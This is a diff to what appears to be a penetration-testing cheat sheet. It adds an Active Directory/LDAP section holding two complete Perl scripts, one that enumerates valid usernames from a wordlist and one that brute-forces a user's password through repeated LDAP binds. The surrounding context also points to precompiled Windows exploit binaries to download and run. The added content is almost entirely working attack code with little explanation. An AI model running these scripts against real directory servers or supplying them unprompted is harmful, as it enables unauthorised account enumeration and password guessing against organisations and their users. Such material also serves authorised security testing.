@@ -2672,3 +2672,68 @@ Combine a small/semi-small dict with a custom
 
 Here is a repository of pre compiled binaries to use for exploit, instead of compile you can download and execute it.
 `https://github.com/abatchy17/WindowsExploits`
+
+## Active Directory and/or LDAP
+
+
+### Username fuzzing in ldap
+
+You need to install `sudo apt-get install -y libnet-ldap-perl` perl module to carryout this enumeration.
+
+```perl
+#!/usr/bin/env perl
+use strict;
+use warnings;
+use Net::LDAP;
+
+my $server   = "ldap.acme.com";
+my $base     = "dc=ldap,dc=acme,dc=com";
+my $filename = "/usr/share/seclists/Usernames/top-usernames-shortlist.txt";
+
+open(my $fh, '<', $filename) or die $!;
+
+my $ldap = Net::LDAP->new($server) or die $@;
+
+while (my $word = <$fh>) {
+    chomp($word);    
+    
+    my $search = $ldap->search(
+        base    => $base,
+        scope   => 'sub',
+        filter  => '(&(uid='.$word.'))',
+        attrs   => ['dn']
+    );
+    
+    print "[+] Found valid login name $word\n"
+if(defined($search->entry));
+}
+```
+
+### Password enumeration against ldap
+
+```perl
+
+#!/usr/bin/env perl
+use strict;
+use warnings;
+use Net::LDAP;my $server   = "ldap.acme.com";
+my $user     = "twest";
+my $base     = "dc=acme,dc=com";
+my $filename = "wordlist.txt";open(my $fh, '<', $filename) or die $!;my $ldap = Net::LDAP->new($server) or die $@;my $search = $ldap->search(
+    base    => $base,
+    scope   => 'sub',
+    filter  => '(&(uid='.$user.'))',
+    attrs   => ['dn']
+);if(defined($search->entry)) {    my $user_dn = $search->entry->dn;    print "[*] Searching for valid LDAP login for $user_dn...\n";    while (my $word = <$fh>) {
+        chomp($word);        my $mesg = $ldap->bind($user_dn, password => $word);        if ($mesg and $mesg->code() == 0) {
+            print "[+] Found valid login $user_dn / $word\n";
+            exit;
+        }
+    }
+} else {
+    print "[x] $user is not a valid LDAP user...\n";
+    exit;
+}
+print "[x] No valid LDAP logins found...\n";
+
+```
